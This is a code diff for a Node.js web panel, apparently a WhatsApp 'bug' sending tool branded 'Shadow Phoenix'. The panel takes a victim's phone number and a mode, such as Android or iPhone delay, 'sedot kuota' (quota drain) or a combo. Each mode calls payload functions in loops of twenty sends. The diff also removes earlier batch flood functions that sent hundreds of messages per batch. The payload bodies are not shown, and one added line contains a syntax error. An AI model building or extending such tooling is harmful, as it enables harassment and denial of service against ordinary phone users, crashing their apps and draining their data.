@@ -605,12 +605,14 @@ app.get("/execution", (req, res) => {
     }
 
     try {
-      if (mode === "andros") {
-        Delayinvisdrayy(target);
-      } else if (mode === "ios") {
-        Delayinvisdrayy(target);
-      } else if (mode === "AndrosDelay") {
-        Delayinvisdrayy(target);
+      if (mode === "sedotkuotaa") {
+        DelayKouta(target);
+      } else if (mode === "delayyiosss") {
+        DelayAndroXIoss(target);
+      } else if (mode === "anrooodelayy") {
+        DelayAndroXIoss(target);
+      } else if (mode === "comboxx") {
+        DelayCombox(target):
       } else {
         throw new Error("Mode tidak dikenal.");
       }
@@ -1163,109 +1165,54 @@ function sleep(ms) {
 
 
 //═══════════//═════════⧼⧼FUNGSI REPEAT⧽⧽═════════//═══════════//
-async function Delayinvisdrayy(target) {
+
+async function DelayCombox(target) {
 for (let i = 0; i < 20; i++) {
+
 await HardKouta(target)
+await sleep(500);
 await DelayHardNew(target)
+await sleep(500);
 await BetaHardDelay(sock, target)
+await sleep(500);
 await DelayPayNew(target)
+await sleep(500);
 await BulldozerXV2(target, false)
-await sleep(1000);
+await sleep(500);
 console.log(chalk.green(`[  ☇ 𝐒𝐡𝐚𝐝𝐨𝐰 𝐏𝐡𝐨𝐞𝐧𝐢𝐱 𝐒𝐞𝐧𝐝 𝟐𝟎 𝐁𝐮𝐠  ]`));
     }
 }
 
-async function Hadowhdelay(durationHours, X) {
-  const totalDurationMs = durationHours * 3600000;
-  const startTime = Date.now();
-  let count = 0;
-  let batch = 1;
-  const maxBatches = 5;
+async function DelayAndroXIoss(target) {
+for (let i = 0; i < 20; i++) {
 
-  const sendNext = async () => {
-    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
-      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
-      return;
+await DelayHardNew(target)
+await sleep(500);
+await BetaHardDelay(sock, target)
+await sleep(500);
+await DelayPayNew(target)
+await sleep(500);
+console.log(chalk.green(`[  ☇ 𝐒𝐡𝐚𝐝𝐨𝐰 𝐏𝐡𝐨𝐞𝐧𝐢𝐱 𝐒𝐞𝐧𝐝 𝟐𝟎 𝐁𝐮𝐠  ]`));
     }
-
-    try {
-      if (count < 100) {
-        await Promise.all([
-          XtravsBetaXx(X, false),
-          XtravsBetaXxV2(X, false)
-        ]);
-        console.log(chalk.yellow(`
-┌────────────────────────┐
-│ ${count + 1}/100 Delay Invis
-└────────────────────────┘
-  `));
-        count++;
-        setTimeout(sendNext, 700);
-      } else {
-        console.log(chalk.green(`Succes Send Bugs to ${X} (Batch ${batch})`));
-        if (batch < maxBatches) {
-          count = 0;
-          batch++;
-          setTimeout(sendNext, 300000);
-        } else {
-          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
-        }
-      }
-    } catch (error) {
-      console.error(`✗ Error saat mengirim: ${error.message}`);
-      setTimeout(sendNext, 700);
-    }
-  };
-  sendNext();
 }
 
-async function iosflood(durationHours, X) {
-  const totalDurationMs = durationHours * 3600000;
-  const startTime = Date.now();
-  let count = 0;
-  let batch = 1;
-  const maxBatches = 5;
+async function DelayKouta(target) {
+for (let i = 0; i < 20; i++) {
 
-  const sendNext = async () => {
-    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
-      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
-      return;
+await BulldozerXV2(target, false)
+await sleep(500);
+await HardKouta(target)
+await sleep(500);
+await BulldozerXV2(target, false)
+await sleep(500);
+await HardKouta(target)
+await sleep(500);
+console.log(chalk.green(`[  ☇ 𝐒𝐡𝐚𝐝𝐨𝐰 𝐏𝐡𝐨𝐞𝐧𝐢𝐱 𝐒𝐞𝐧𝐝 𝟐𝟎 𝐁𝐮𝐠  ]`));
     }
-
-    try {
-      if (count < 400) {
-        await Promise.all([
-          iosinVisFC(X),
-          NewProtocolbug6(X),
-          VtxForceDelMsg2(X)
-        ]);
-        console.log(chalk.yellow(`
-┌────────────────────────┐
-│ ${count + 1}/400 IOS🕊️
-└────────────────────────┘
-  `));
-        count++;
-        setTimeout(sendNext, 700);
-      } else {
-        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
-        if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade X-ATHENA 🍂 777 ).`));
-          count = 0;
-          batch++;
-          setTimeout(sendNext, 300000);
-        } else {
-          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
-        }
-      }
-    } catch (error) {
-      console.error(`✗ Error saat mengirim: ${error.message}`);
-      setTimeout(sendNext, 700);
-    }
-  };
-  sendNext();
 }
 
 // ==================== HTML EXECUTION ==================== //
+
 const executionPage = (
   status = "🟥 Ready",
   detail = {},
@@ -1340,18 +1287,6 @@ const executionPage = (
       justify-content: center;
       align-items: center;
     }
-    .video-brand { 
-    width: 100%;
-    max-width: 420px;
-    border-radius: 15px; 
-    border: 2px solid var(--glass-border); 
-    box-shadow: 0 0 20px rgba(138, 99, 210, 0.3); 
-    display: block; 
-    margin: 0 auto 16px; 
-    height: auto;
-    aspect-ratio: 16/9;
-    transition: all 0.3s ease;
-}
     .connected::before {
       content: '';
       width: 10px;
@@ -1423,6 +1358,18 @@ const executionPage = (
       gap: 8px;
       margin-top: 20px;
     }
+    .video-brand { 
+     width: 100%;
+     max-width: 420px;
+     border-radius: 15px; 
+     border: 2px solid var(--glass-border); 
+     box-shadow: 0 0 20px rgba(138, 99, 210, 0.3); 
+     display: block; 
+     margin: 0 auto 16px; 
+     height: auto;
+     aspect-ratio: 16/9;
+     transition: all 0.3s ease;
+    }
     .footer-button {
       background: rgba(138, 3, 3, 0.15);
       border: 1px solid #8A0303;
@@ -1456,15 +1403,16 @@ const executionPage = (
     <div class="username">Olá, ${username || 'Anônimo'}</div>
     <div class="connected">CONNECTED</div>
 
-    <input type="text" id="numberInput" placeholder="Please input target number. example : +628xxxxxxx or 628xxxxxxx or +1202xxxxxxx" />
+    <input type="text" id="numberInput" placeholder="example : +628xxxxxxx or 628xxxxxxx or +1202xxxxxxx" />
 
     <div class="select-wrapper">
       <select id="modeSelect">
-        <option value="" disabled selected>      Select Bugs</option>
-        <option value="anrooodelayy">S-P DELAY ANDROID</option>
+        <option value="" disabled selected>---Select Bugs---</option>
+        <option value="anrooodelayy">S-P DELAY ANDRO</option>
         <option value="delayyiosss">S-P DELAY IPHONE</option>
-        <option value="delayyiosss">S-P DELAY HARD</option>
-        <option value="sedotkuotaa">S-P SEDOT KUOTA</option>
+        <option value="sedotkuotaa">S-P BULDOZER</option>
+        <option value="sedotkuotaa">S-P BULDOZER HARD</option>
+        <option value="comboxx">S-P COMBO DELAY</option>
       </select>
     </div>
 
